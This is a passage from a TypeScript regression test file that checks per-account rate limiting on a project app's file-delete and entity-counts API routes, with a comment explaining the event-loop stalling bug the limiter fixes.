    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A completely different account must get its own fresh allowance --
    // keyed by user id, not IP, so one account exhausting its own budget
    // must never collaterally block an unrelated account's own deletes.
    const otherEmail = `file-delete-rate-limit-other-${randomUUID()}@example.com`;
    const otherToken = await signup(baseUrl, otherEmail);
    const otherUser = findUserByEmail(db, otherEmail)!;
    const otherProjectId = randomUUID();
    insertProject(db, { id: otherProjectId, ownerId: otherUser.id, name: "CRM 2", description: "test", spec });
    diffAndMigrate(db, otherProjectId, undefined, spec);
    markProjectBuilt(db, otherProjectId);

    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProjectId}/entities/Customer/fields/receipt/upload`, {
      method: "DELETE",
      headers: { authorization: `Bearer ${otherToken}`, "content-type": "application/json" },
      body: JSON.stringify({ url: `/uploads/${otherProjectId}/Customer/does-not-exist-other.pdf` }),
    });
    assert.equal(otherRes.status, 204, "a different account must not be collaterally blocked by another account's own rate limit");
  });
});

/**
 * Regression test for a real bug found by round 1086's Explore survey:
 * unlike its siblings /export, /backup, and /twin (round 1053, behind
 * expensiveReadRateLimiter), GET .../entity-counts had NO volumetric
 * throttle at all, despite countRecords (packages/db/src/repository.ts)
 * being a fully synchronous better-sqlite3 COUNT(*) run once per entity in
 * a loop -- real, uncapped synchronous work on this app's single Node
 * event loop. Any authenticated collaborator with mere read access (this
 * route uses requireProjectAccess, not requireProjectWriteAccess) could
 * script an unbounded loop of requests, stalling every other user's and
 * project's requests too. Confirms the new limiter, mirroring every
 * sibling rate-limit test's own shape above: the 61st call is rejected
 * with 429, while a different account is unaffected.
 */
test("GET .../entity-counts is rate-limited per authenticated account: the 61st call is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `entity-counts-rate-limit-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Customer", fields: [{ name: "name", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    for (let i = 0; i < 60; i++) {
      const res = await fetch(`${baseUrl}/api/projects/${projectId}/entity-counts`, {
        headers: authHeaders(token),
      });
      assert.notEqual(res.status, 429, `call ${i + 1} of 60 (within the limit) must not be rate-limited yet`);
    }

    const blocked = await fetch(`${baseUrl}/api/projects/${projectId}/entity-counts`, {
      headers: authHeaders(token),
    });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A completely different account must get its own fresh allowance --
    // keyed by user id, not IP, so one account exhausting its own budget
    // must never collaterally block an unrelated account's own calls.
    const otherEmail = `entity-counts-rate-limit-other-${randomUUID()}@example.com`;
    const otherToken = await signup(baseUrl, otherEmail);
    const otherUser = findUserByEmail(db, otherEmail)!;
    const otherProjectId = randomUUID();
    insertProject(db, { id: otherProjectId, ownerId: otherUser.id, name: "CRM 2", description: "test", spec });
    diffAndMigrate(db, otherProjectId, undefined, spec);
    markProjectBuilt(db, otherProjectId);

    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProjectId}/entity-counts`, {
      headers: authHeaders(otherToken),
    });
    assert.equal(otherRes.status, 200, "a different account must not be collaterally blocked by another account's own rate limit");
  });
});
